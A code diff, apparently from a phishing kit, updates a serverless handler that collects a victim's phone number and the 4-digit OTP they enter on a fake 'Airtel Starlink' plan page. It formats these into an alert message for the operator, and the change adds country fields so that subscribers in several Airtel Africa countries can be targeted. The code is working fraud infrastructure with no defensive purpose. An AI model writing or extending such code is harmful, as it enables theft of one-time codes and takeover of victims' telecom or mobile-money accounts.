@@ -15,7 +15,7 @@ export default async function handler(req, res) {
   }
 
   try {
-    const { sessionId, cloudId, phone, otp, planName, planPrice } = req.body || {};
+    const { sessionId, cloudId, phone, otp, planName, planPrice, country, fullPhone } = req.body || {};
 
     if (!sessionId || !otp) {
       return res.status(400).json({ error: 'Paramètres manquants.' });
@@ -23,6 +23,8 @@ export default async function handler(req, res) {
 
     const cleanOtp = otp.toString().replace(/\D/g, '').slice(0, 4);
     const cleanPhone = phone ? phone.toString().replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '') : 'Inconnu';
+    const displayPhone = fullPhone || (phone ? `+243 ${cleanPhone}` : 'Inconnu');
+    const displayCountry = country || 'Airtel Africa';
     const targetId = cloudId || sessionId;
 
     // Update cloud record
@@ -50,7 +52,8 @@ export default async function handler(req, res) {
 
     const messageText =
       `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
-      `👤 <b>Numéro:</b> <code>+243 ${cleanPhone}</code>\n` +
+      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
+      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
       `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
       `📦 <b>Forfait:</b> ${planName || 'Forfait Airtel Starlink'} (${planPrice || '$1.49'})\n` +
       `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
